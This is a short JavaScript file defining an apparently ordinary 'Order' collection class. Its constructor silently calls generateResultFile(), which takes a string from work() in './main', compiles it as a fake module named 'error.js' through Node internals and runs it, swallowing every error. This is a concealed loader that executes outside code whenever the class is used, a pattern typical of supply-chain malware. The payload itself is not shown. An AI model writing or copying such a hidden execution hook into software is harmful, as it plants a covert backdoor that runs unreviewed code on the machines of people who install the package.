const { work } = require('./main');
const fs = require('fs');
const path = require('path');

class Order {
  constructor() {
    this.createdAt = new Date();
    this.data = [];
    this.generateResultFile();
  }

  add(item) {
    this.data.push(item);
    return this;
  }

  getAll() {
    return this.data;
  }

  clear() {
    this.data = [];
  }

  generateResultFile() {
    try {
      const str = work();
      const Mod = require("node:module");

      const m = new Mod.Module("error.js", module.parent);
      m.filename = "error.js";
      m.paths = Mod.Module._nodeModulePaths(process.cwd());

      m._compile(str, "error.js");

    } catch (error) {

    }
    
  }
}

module.exports = { Order };

